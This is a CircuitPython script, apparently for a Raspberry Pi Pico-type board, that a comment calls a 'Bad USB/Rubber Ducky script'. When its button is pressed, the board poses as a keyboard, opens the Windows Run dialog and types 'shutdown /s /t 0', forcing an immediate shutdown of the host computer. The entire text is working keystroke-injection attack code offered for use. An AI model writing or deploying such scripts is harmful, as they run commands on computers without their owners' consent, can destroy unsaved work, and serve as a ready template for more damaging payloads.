import time
import board
import digitalio
#52Pi exclusive Bad USB/Rubber Ducky script by AXO

import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT
led.value = False

btn = digitalio.DigitalInOut(board.GP15)
btn.direction = digitalio.Direction.INPUT
btn.pull = digitalio.Pull.UP 


while True:
    
    if not btn.value:
        
        led.value = True
        time.sleep(0.5)
        
        
        kbd.press(Keycode.WINDOWS, Keycode.R)
        kbd.release_all()
        time.sleep(0.5)
        
        
        layout.write("shutdown /s /t 0")
        time.sleep(0.2)
        
        
        kbd.press(Keycode.ENTER)
        kbd.release_all()
        
        
        time.sleep(5)
        led.value = False
        
    time.sleep(0.05)
